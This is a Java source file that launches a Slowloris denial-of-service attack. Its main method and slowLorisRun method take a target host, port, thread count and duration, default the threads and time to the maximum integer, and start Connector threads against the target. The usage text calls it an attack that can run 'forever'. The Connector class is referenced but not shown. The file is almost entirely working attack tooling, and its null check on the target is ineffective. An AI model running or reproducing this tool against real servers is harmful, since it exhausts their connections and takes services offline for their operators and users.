package testFiles;

import java.net.MalformedURLException;

/**
 * Created by connor on 14/11/15.
 */
public class mainForSlowLoris
{
	
	public void slowLorisRun(String target, int port, int threads, int time)
	{
		if(target.equals(null))
		{
			System.out.println("You must input a target silly");
		}
		if(port == 0)
		{
			System.out.println("No port input, using default 80");
			port = 80;
		}
		if(threads == 0)
		{
			System.out.println("No number of threads specified, using maximum allowed (UNSTABLE)");
			threads = 2147483647;
		}
		if(time == 0)
		{
			System.out.println("No time specified, using maximum");
			time = 2147483647;
		}
		
		 for(int i = 0; i < threads; i++)
	        {
	            try
	            {
	                Connector connector = new Connector(target, port, time);
	                new Thread(connector).start();
	            }
	            catch(MalformedURLException mue)
	            {
	                die(mue.getMessage()); // fatal error
	            }
	        }
		
	}
	
    public static void main(String[] args)
    {
        if(args.length != 4)
            die("Example usage:\n\tjava jSlowLoris TARGET PORT NUMBER_OF_THREADS TIMER\n\t\tTARGET the address of the target\n\t\tPORT the port on the target server to connect to\n\t\tNUMBER_OF_THREADS how many threads the program should create. Each thread has 50 associated connections\n\t\tTIMER how long the attack should last in minutes. Use 0 for forever");

        int port = 0;
        int threads = 0;
        int timer = 0;
        try
        {
            port = Integer.parseInt(args[1]);
            threads = Integer.parseInt(args[2]);
            timer = Integer.parseInt(args[3]);
        }
        catch(NumberFormatException nfe)
        {
            die(nfe.getMessage());
        }

        for(int i = 0; i < threads; i++)
        {
            try
            {
                Connector connector = new Connector(args[0], port, timer);
                new Thread(connector).start();
            }
            catch(MalformedURLException mue)
            {
                die(mue.getMessage()); // fatal error
            }
        }
    }

    /**
     * prints an error message and exits the program
     * @param deathMsg msg that indicates the cause of the fatal error
     */
    private static void die(String deathMsg)
    {
        System.err.println(deathMsg);
        System.exit(-1);
    }
}
